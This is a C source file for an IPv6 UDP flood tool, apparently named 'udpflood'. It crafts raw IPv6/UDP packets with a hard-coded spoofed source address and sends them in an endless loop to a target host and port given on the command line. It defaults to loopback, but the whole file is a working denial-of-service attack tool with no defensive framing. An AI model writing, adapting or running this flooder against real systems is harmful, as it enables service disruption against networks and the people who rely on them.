#include <stdio.h>
#include <stdlib.h>
#include <libgen.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/udp.h>      
#include <netinet/ip6.h> 
#include <net/if.h>
#include <netdb.h>
#include <memory.h>
#include <time.h>
#include <unistd.h>
#include <ctype.h>
#include <errno.h>
#include <linux/if_ether.h>   
#include <linux/if_packet.h>  
#include <string.h>
#include <sys/types.h>
   

int main(int argc, char *argv[])
{ 
	srand(time(0));
	  
	// tagret address information
    	struct sockaddr_ll info;
    	memset (&info, 0, sizeof (info));
    	
    	// our interface is the loopback
    	char interface[INET6_ADDRSTRLEN] = "lo"; 
    	
    	// (need to be random??)   	
    	char *source_ip = "::128";
    	
    	// default target is ::1
    	char *target_ip = "::1";
    	int c;
    	int dport = 443;
    	
    	// check interface
    	if ((info.sll_ifindex = if_nametoindex (interface)) == 0) 
    	{
      		perror ("if_nametoindex() failed");
      		exit (EXIT_FAILURE);
    	}
    
    	// usage
    	opterr = 0;
    	while((c = getopt(argc, argv, "t:p:")) != -1)
    	{
        	switch(c)
        	{
        		case 't': // the target hostname/ip address
            		target_ip = optarg;
            		break;
            		
            		case 'p': // port
            		dport = atoi(optarg);
            		break;
            		
            		case '?': // garbage
            		if (optopt == 't' || optopt == 'p')
                		fprintf (stderr, "Option -%c requires an argument.\n", optopt);
            		else if (isprint (optopt))
                		fprintf (stderr, "Unknown option `-%c'.\n", optopt);
            		else
                		fprintf (stderr, "Unknown option character `\\x%x'.\n", optopt);
            		exit(EXIT_FAILURE);
            		break;
            		
        		default: // fail
            		printf("Usage: udpflood -t hostname -p portname \n");
    			exit(EXIT_FAILURE);
            		break;
            	
        	}
	}

  	struct addrinfo hints, *res;
  	memset (&hints, 0, sizeof (hints));
  	hints.ai_family = AF_INET6;
  	hints.ai_socktype = SOCK_RAW;
  	
  	int error;
  	
  	if ((error = getaddrinfo (target_ip, NULL, &hints, &res)) != 0) 
  	{
    		fprintf (stderr, "getaddrinfo() failed for target: %s\n", gai_strerror (error));
    		exit (EXIT_FAILURE);
  	}
  	
  	struct sockaddr_in6 *ipv6;
  	ipv6 = (struct sockaddr_in6 *) res->ai_addr;
  	char destination_ip[INET6_ADDRSTRLEN] = "";
  	
  	// convert binary address to text
  	if (inet_ntop (AF_INET6, &ipv6->sin6_addr, destination_ip, INET6_ADDRSTRLEN) == NULL) 
  	{
    		fprintf (stderr, "inet_ntop() failed \n");
    		exit (EXIT_FAILURE);
  	}
  	
  	freeaddrinfo (res);

  	info.sll_family = AF_PACKET;
  	info.sll_protocol = htons (ETH_P_IPV6);
  	

  	struct ip6_hdr ip_header;
  	struct udphdr udp_header;
  	
  	// ip header
  	ip_header.ip6_flow = htonl ((0x60000000));
    	ip_header.ip6_plen = htons (sizeof(struct udphdr));
    	ip_header.ip6_nxt = IPPROTO_UDP;

  	// converting source ip to network address structure
  	if ((inet_pton (AF_INET6, source_ip, &(ip_header.ip6_src))) != 1) 
  	{
    		fprintf (stderr, "inet_pton() failed.\n");
    		exit (EXIT_FAILURE);
  	}

  	// converting destination ip to network address structure
  	if ((inet_pton (AF_INET6, destination_ip, &(ip_header.ip6_dst))) != 1) 
  	{
    		fprintf (stderr, "inet_pton() failed.\n");
    		exit (EXIT_FAILURE);
  	}

    	// UDP header
    	udp_header.source = htons (123);
    	udp_header.dest = htons (dport);
    	udp_header.len = htons (sizeof(struct udphdr));
    	udp_header.check = 0;
  	
  	int buffer;
    	buffer = sizeof(struct ip6_hdr) + sizeof(struct udphdr);
  
  	uint8_t ether[65535] = {};
  	uint8_t data[65535] = {};
  	
  	memcpy (ether, &ip_header, sizeof(struct ip6_hdr) * sizeof (uint8_t));
    	memcpy (ether + sizeof(struct ip6_hdr), &udp_header, sizeof(struct udphdr) * sizeof (uint8_t));
    	memcpy (ether + sizeof(struct ip6_hdr) + sizeof(struct udphdr), data, 0);
  
  	// open socket
  	int sock;
  	if ((sock = socket (PF_PACKET, SOCK_DGRAM, htons (ETH_P_ALL))) < 0) 
  	{
    		perror ("socket() failed ");
    		exit (EXIT_FAILURE);
  	}

	// send packets, to stop press ctrl+c
  	while (1)
  	{
    		int bytes;
    		if ((sendto (sock, ether, buffer, 0, (struct sockaddr *) &info, sizeof (info))) <= 0) 
    		{
      			perror ("sendto() failed");
      			exit (EXIT_FAILURE);
    		}
    		
    		else
    		{
      			printf("packet sent to %s via port %d \n", target_ip, dport);
      			printf("press ctrl+c to STOP!\n\n");
    		}
  	}
    	
  	close (sock);
  	
    	return 0;
}
